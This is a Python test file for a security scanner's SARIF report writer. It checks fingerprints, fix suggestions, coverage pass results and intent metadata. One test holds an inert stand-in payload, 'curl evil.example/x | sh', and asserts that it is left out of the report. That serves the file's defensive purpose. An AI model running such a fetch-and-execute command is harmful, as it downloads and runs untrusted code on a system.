"""Tests for the SARIF 2.1.0 emitter in strix.report.sarif."""

from __future__ import annotations

import json
from typing import TYPE_CHECKING, Any

from strix.report.sarif import write_sarif


if TYPE_CHECKING:
    from pathlib import Path


def _read(run_dir: Path) -> dict[str, Any]:
    doc = json.loads((run_dir / "findings.sarif").read_text(encoding="utf-8"))
    assert isinstance(doc, dict)
    return doc


def _finding(**overrides: Any) -> dict[str, Any]:
    base: dict[str, Any] = {
        "id": "vuln-0001",
        "title": "SQL Injection in get_user",
        "severity": "critical",
        "cwe": "CWE-89",
        "timestamp": "2026-07-02 10:00:00 UTC",
        "code_locations": [{"file": "app.py", "start_line": 4}],
    }
    base.update(overrides)
    return base


def test_write_sarif_basic_shape(tmp_path: Path) -> None:
    write_sarif(tmp_path, [_finding()])
    doc = _read(tmp_path)

    assert doc["version"] == "2.1.0"
    assert "2.1.0" in doc["$schema"]
    run = doc["runs"][0]
    assert run["tool"]["driver"]["name"] == "Strix"
    assert len(run["results"]) == 1
    loc = run["results"][0]["locations"][0]["physicalLocation"]
    assert loc["artifactLocation"]["uri"] == "app.py"
    assert loc["region"]["startLine"] == 4


def test_write_sarif_always_emits_for_zero_findings(tmp_path: Path) -> None:
    # A clean run must still write an (empty) document so a SARIF consumer can
    # auto-resolve alerts that are absent from the new submission.
    out = write_sarif(tmp_path, [])
    assert out.exists()
    doc = _read(tmp_path)
    assert doc["version"] == "2.1.0"
    assert doc["runs"][0]["results"] == []


def test_write_sarif_tool_version_is_reported(tmp_path: Path) -> None:
    write_sarif(tmp_path, [_finding()], tool_version="9.9.9")
    assert _read(tmp_path)["runs"][0]["tool"]["driver"]["version"] == "9.9.9"


def test_write_sarif_locationless_finding_is_anchored_not_dropped(tmp_path: Path) -> None:
    # A finding with no code location must still appear (anchored to a stable
    # fallback), never be silently dropped from the report.
    write_sarif(tmp_path, [_finding(id="vuln-0002", code_locations=None)])
    results = _read(tmp_path)["runs"][0]["results"]
    assert len(results) == 1
    uri = results[0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
    assert uri == "SECURITY.md"


def test_write_sarif_fingerprint_stable_across_title_rewording(tmp_path: Path) -> None:
    # The same finding at the same location with a reworded title must keep the
    # same partialFingerprints, so a re-scan doesn't churn code-scanning alerts.
    a = tmp_path / "a"
    b = tmp_path / "b"
    a.mkdir()
    b.mkdir()
    write_sarif(a, [_finding(title="SQL Injection in get_user")])
    write_sarif(b, [_finding(title="SQLi via string-formatted query in get_user")])

    fp_a = _read(a)["runs"][0]["results"][0]["partialFingerprints"]
    fp_b = _read(b)["runs"][0]["results"][0]["partialFingerprints"]
    assert fp_a == fp_b


def test_write_sarif_distinct_findings_get_distinct_fingerprints(tmp_path: Path) -> None:
    write_sarif(
        tmp_path,
        [
            _finding(
                id="vuln-0001", cwe="CWE-89", code_locations=[{"file": "app.py", "start_line": 4}]
            ),
            _finding(
                id="vuln-0002", cwe="CWE-78", code_locations=[{"file": "cmd.py", "start_line": 4}]
            ),
        ],
    )
    results = _read(tmp_path)["runs"][0]["results"]
    assert len(results) == 2
    fps = {json.dumps(r["partialFingerprints"], sort_keys=True) for r in results}
    assert len(fps) == 2


def test_write_sarif_never_embeds_poc_script(tmp_path: Path) -> None:
    # SARIF is written for external upload; the weaponized exploit body must
    # never appear in it. Only a presence flag + the description are surfaced.
    # NOTE: `marker` is an inert string literal (a stand-in for an exploit
    # payload) that this test asserts is ABSENT from the output — it is never
    # executed, parsed, or run as code.
    marker = "EXPLOIT-PAYLOAD-MARKER curl evil.example/x | sh"
    write_sarif(
        tmp_path,
        [
            _finding(
                poc_description="Send a crafted request to trigger the sink.",
                poc_script_code=marker,
            )
        ],
    )
    raw = (tmp_path / "findings.sarif").read_text(encoding="utf-8")
    assert marker not in raw
    assert "EXPLOIT-PAYLOAD-MARKER" not in raw

    poc = _read(tmp_path)["runs"][0]["results"][0]["properties"]["strix"]["poc"]
    assert poc["script_available"] is True
    assert "script" not in poc
    assert poc["description"] == "Send a crafted request to trigger the sink."


def test_write_sarif_builds_fixes_from_code_location_fix_pairs(tmp_path: Path) -> None:
    # A code location carrying fix_before/fix_after must surface as a SARIF
    # fix (artifactChange/replacement) so consumers can offer a one-click fix.
    write_sarif(
        tmp_path,
        [
            _finding(
                remediation_steps="Use a parameterized query.",
                code_locations=[
                    {
                        "file": "app.py",
                        "start_line": 4,
                        "end_line": 4,
                        "fix_before": 'query = "SELECT * FROM u WHERE id=" + uid',
                        "fix_after": 'query = "SELECT * FROM u WHERE id=%s"',
                    }
                ],
            )
        ],
    )
    result = _read(tmp_path)["runs"][0]["results"][0]
    fixes = result["fixes"]
    assert len(fixes) == 1
    change = fixes[0]["artifactChanges"][0]
    assert change["artifactLocation"]["uri"] == "app.py"
    replacement = change["replacements"][0]
    assert replacement["deletedRegion"]["startLine"] == 4
    assert replacement["insertedContent"]["text"] == 'query = "SELECT * FROM u WHERE id=%s"'


def test_write_sarif_omits_fixes_without_fix_pairs(tmp_path: Path) -> None:
    write_sarif(tmp_path, [_finding()])
    assert "fixes" not in _read(tmp_path)["runs"][0]["results"][0]


def test_write_sarif_adds_logical_location_for_endpoint(tmp_path: Path) -> None:
    # DAST findings hang off an endpoint; it must be preserved as a logical
    # location so the finding keeps an addressable anchor.
    write_sarif(tmp_path, [_finding(endpoint="GET /api/users/{id}")])
    locations = _read(tmp_path)["runs"][0]["results"][0]["locations"]
    logical = [
        entry
        for loc in locations
        for entry in loc.get("logicalLocations", [])
        if entry.get("kind") == "endpoint"
    ]
    assert logical == [{"fullyQualifiedName": "GET /api/users/{id}", "kind": "endpoint"}]


def test_write_sarif_synthetic_finding_falls_back_to_resource_logical_location(
    tmp_path: Path,
) -> None:
    # No code location and no endpoint: the target becomes a resource logical
    # location so a locationless finding still carries a meaningful anchor.
    write_sarif(
        tmp_path,
        [_finding(code_locations=None, endpoint=None, target="https://api.example.com")],
    )
    result = _read(tmp_path)["runs"][0]["results"][0]
    assert result["properties"]["synthetic_location"] is True
    logical = [
        entry
        for loc in result["locations"]
        for entry in loc.get("logicalLocations", [])
        if entry.get("kind") == "resource"
    ]
    assert logical == [{"fullyQualifiedName": "https://api.example.com", "kind": "resource"}]


def test_write_sarif_emits_version_control_provenance(tmp_path: Path) -> None:
    write_sarif(
        tmp_path,
        [_finding()],
        repository_context={
            "repositoryUri": "https://github.com/acme/widget",
            "repositoryFullName": "acme/widget",
            "commitSha": "abc123def456",
            "branch": "main",
            "ref": "refs/heads/main",
        },
    )
    run = _read(tmp_path)["runs"][0]
    assert run["automationDetails"] == {"id": "strix/acme/widget"}
    provenance = run["versionControlProvenance"][0]
    assert provenance == {
        "repositoryUri": "https://github.com/acme/widget",
        "revisionId": "abc123def456",
        "branch": "main",
    }
    assert run["properties"]["repository"] == "acme/widget"
    assert run["properties"]["commit_sha"] == "abc123def456"
    assert run["properties"]["ref"] == "refs/heads/main"


def test_write_sarif_omits_provenance_when_no_repository_context(tmp_path: Path) -> None:
    # DAST / URL scans have no VCS; provenance fields must be absent, not empty.
    write_sarif(tmp_path, [_finding()])
    run = _read(tmp_path)["runs"][0]
    assert "versionControlProvenance" not in run
    assert "automationDetails" not in run


def test_write_sarif_replaces_atomically_no_partial_on_reemit(tmp_path: Path) -> None:
    # A re-emit must land a complete document, never leave a stray temp file
    # or a truncated target alongside it.
    write_sarif(tmp_path, [_finding()])
    write_sarif(tmp_path, [_finding(), _finding(id="vuln-0002", cwe="CWE-78")])

    # Only the final artifact remains — no leftover .tmp siblings.
    leftovers = [p.name for p in tmp_path.iterdir() if p.name != "findings.sarif"]
    assert leftovers == []
    # And it parses as a complete document with both findings.
    assert len(_read(tmp_path)["runs"][0]["results"]) == 2


def _coverage(*entries: dict[str, Any], **overrides: Any) -> dict[str, Any]:
    doc: dict[str, Any] = {
        "entries": list(entries),
        "completeness": {"complete": True, "caveats": []},
    }
    doc.update(overrides)
    return doc


def _coverage_entry(**overrides: Any) -> dict[str, Any]:
    base: dict[str, Any] = {
        "surface": "POST /api/orders/{id}",
        "risk_area": "SQL injection",
        "outcome": "no_issue_found",
        "outcome_label": "No issue identified",
        "evidence": "14 parameters fuzzed; all queries parameterized.",
        "recorded_by": "injection-tester",
        "source": "agent_reported",
    }
    base.update(overrides)
    return base


def test_cleared_surface_becomes_a_passing_result(tmp_path: Path) -> None:
    """ "Tested and clean" is a SARIF pass, not an absent result."""
    write_sarif(tmp_path, [], coverage=_coverage(_coverage_entry()))
    results = _read(tmp_path)["runs"][0]["results"]

    assert len(results) == 1
    assert results[0]["kind"] == "pass"
    # SARIF requires level "none" on any result that is not a failure.
    assert results[0]["level"] == "none"
    assert "14 parameters fuzzed" in results[0]["message"]["text"]


def test_coverage_outcomes_map_to_their_sarif_kinds(tmp_path: Path) -> None:
    write_sarif(
        tmp_path,
        [],
        coverage=_coverage(
            _coverage_entry(outcome="ruled_out", risk_area="XSS"),
            _coverage_entry(outcome="not_applicable", risk_area="XXE"),
            _coverage_entry(outcome="needs_follow_up", risk_area="SSRF"),
        ),
    )
    kinds = [result["kind"] for result in _read(tmp_path)["runs"][0]["results"]]

    assert kinds == ["pass", "notApplicable", "open"]


def test_reported_coverage_is_not_duplicated_as_a_pass(tmp_path: Path) -> None:
    """A surface that produced a finding is already in results as a failure."""
    write_sarif(
        tmp_path,
        [_finding()],
        coverage=_coverage(_coverage_entry(outcome="reported")),
    )
    results = _read(tmp_path)["runs"][0]["results"]

    assert len(results) == 1
    assert results[0].get("kind", "fail") == "fail"


def test_coverage_results_declare_their_own_rules(tmp_path: Path) -> None:
    write_sarif(
        tmp_path,
        [_finding()],
        coverage=_coverage(
            _coverage_entry(risk_area="SQL injection"),
            _coverage_entry(risk_area="SQL injection", surface="GET /search"),
        ),
    )
    run = _read(tmp_path)["runs"][0]
    rules = run["tool"]["driver"]["rules"]
    coverage_rules = [rule for rule in rules if rule["id"].startswith("strix-coverage/")]

    # Both entries share one rule, and every result's ruleIndex resolves to it.
    assert len(coverage_rules) == 1
    assert coverage_rules[0]["defaultConfiguration"]["level"] == "none"
    for result in run["results"]:
        assert rules[result["ruleIndex"]]["id"] == result["ruleId"]


def test_incomplete_run_is_flagged_on_the_invocation(tmp_path: Path) -> None:
    """A scan cut short must not be indistinguishable from a clean one."""
    write_sarif(
        tmp_path,
        [],
        coverage=_coverage(
            _coverage_entry(),
            completeness={"complete": False, "caveats": ["Budget exhausted."]},
        ),
    )
    invocation = _read(tmp_path)["runs"][0]["invocations"][0]

    assert invocation["executionSuccessful"] is False
    assert invocation["toolExecutionNotifications"][0]["message"]["text"] == "Budget exhausted."


def test_complete_run_reports_a_successful_invocation(tmp_path: Path) -> None:
    write_sarif(tmp_path, [], coverage=_coverage(_coverage_entry()))
    invocation = _read(tmp_path)["runs"][0]["invocations"][0]

    assert invocation["executionSuccessful"] is True
    assert "toolExecutionNotifications" not in invocation


def test_calibration_metadata_survives_into_result_properties(tmp_path: Path) -> None:
    write_sarif(
        tmp_path,
        [
            _finding(
                confidence="medium",
                counterevidence="WAF blocks the naive payload.",
                confidence_rationale="Reproduced once out of three attempts.",
                severity_change_conditions="Critical if the WAF rule is removed.",
                fix_verification="Not retested.",
            )
        ],
    )
    strix = _read(tmp_path)["runs"][0]["results"][0]["properties"]["strix"]

    assert strix["confidence"] == "medium"
    assert strix["counterevidence"] == "WAF blocks the naive payload."
    assert strix["confidence_rationale"] == "Reproduced once out of three attempts."
    assert strix["severity_change_conditions"] == "Critical if the WAF rule is removed."
    assert strix["fix_verification"] == "Not retested."


def _intent_fields(**overrides: Any) -> dict[str, Any]:
    """The persisted developer-intent block, as the reporting tool writes it."""
    fields: dict[str, Any] = {
        "intent_check_status": "completed",
        "intent_search_scope": [
            "doc/development/permissions (grep for import boundary)",
            "spec/requests/api/imports_spec.rb",
            "git log -S import_source_user",
        ],
        "intent_evidence": [
            {
                "source": "doc/development/permissions/granular_access/"
                "rest_api_implementation_guide.md",
                "authority": "implementation_spec",
                "supports": "import endpoints may resolve a group or a user boundary",
                "contradicts": "",
                "stale": False,
                "note": "lines 181-199",
            },
            {
                "source": "CHANGELOG.md",
                "authority": "history",
                "supports": "",
                "contradicts": "the route was tightened to project owners",
                "stale": True,
                "note": "",
            },
        ],
        "known_issue_or_duplicate_search": (
            "Searched CHANGELOG and the issue tracker for PAT scope handling on imports; no entry."
        ),
        "alternative_semantics_check": (
            "Access is granted when any one resolved boundary is satisfied, so the user "
            "boundary is a satisfied alternative rather than a bypass."
        ),
        "security_contract_conflict": {
            "kind": "conflicting_security_invariant",
            "invariant": (
                "A fine-grained PAT scoped to a user must never reach a group the token was not "
                "scoped to."
            ),
            "source": "SECURITY.md (fine-grained token promises)",
            "impact": "A user-scoped token reads and writes every project under the target group.",
        },
        "intent_review": {
            "reviewer_kind": "independent_agent",
            "reviewed_by": "reviewer-agent-2",
            "verdict": "intent_confirmed",
            "notes": "Re-read the guide and both route files; the OR semantics are explicit.",
        },
        "intent_gate": {
            "applies": True,
            "disposition": "report_conflict",
            "reasons": [],
            "warnings": ["Only non-authoritative evidence supports the remaining claim."],
        },
    }
    fields.update(overrides)
    return fields


def test_result_properties_carry_the_intent_block(tmp_path: Path) -> None:
    """Downstream tooling reads the disposition and evidence sources from the
    property bag, without parsing the finding's markdown."""
    write_sarif(tmp_path, [_finding(**_intent_fields())])

    strix = _read(tmp_path)["runs"][0]["results"][0]["properties"]["strix"]
    intent = strix["intent"]

    assert intent["status"] == "completed"
    assert intent["disposition"] == "report_conflict"
    assert intent["search_scope"] == [
        "doc/development/permissions (grep for import boundary)",
        "spec/requests/api/imports_spec.rb",
        "git log -S import_source_user",
    ]
    assert intent["evidence"][0]["source"] == (
        "doc/development/permissions/granular_access/rest_api_implementation_guide.md"
    )
    assert intent["evidence"][0]["authority"] == "implementation_spec"
    assert intent["evidence"][0]["stale"] is False
    assert intent["evidence"][1] == {
        "source": "CHANGELOG.md",
        "authority": "history",
        "supports": "",
        "contradicts": "the route was tightened to project owners",
        "stale": True,
        "note": "",
    }
    assert intent["conflict"]["kind"] == "conflicting_security_invariant"
    assert intent["conflict"]["source"] == "SECURITY.md (fine-grained token promises)"
    assert intent["review"]["verdict"] == "intent_confirmed"
    assert intent["review"]["reviewed_by"] == "reviewer-agent-2"
    assert intent["warnings"] == ["Only non-authoritative evidence supports the remaining claim."]
    # The intent evidence is not duplicated into the flat property list.
    assert "intent_gate" not in strix


def test_result_properties_omit_intent_without_metadata(tmp_path: Path) -> None:
    """A black-box finding (or one filed before the gate) keeps its old shape."""
    write_sarif(tmp_path, [_finding()])

    result = _read(tmp_path)["runs"][0]["results"][0]
    strix = result["properties"]["strix"]

    assert "intent" not in strix
    assert "intent_gate" not in strix
    assert "intent_evidence" not in strix
    # Still a valid document with the same property shape as before.
    assert strix["id"] == "vuln-0001"
    assert result["properties"]["security-severity"] == "9.5"


def test_result_properties_survive_partial_intent_metadata(tmp_path: Path) -> None:
    write_sarif(tmp_path, [_finding(intent_check_status="unavailable")])

    intent = _read(tmp_path)["runs"][0]["results"][0]["properties"]["strix"]["intent"]

    assert intent["status"] == "unavailable"
    assert intent["disposition"] == "not_recorded"
    assert intent["evidence"] == []
    assert intent["conflict"] is None
    assert intent["review"] is None
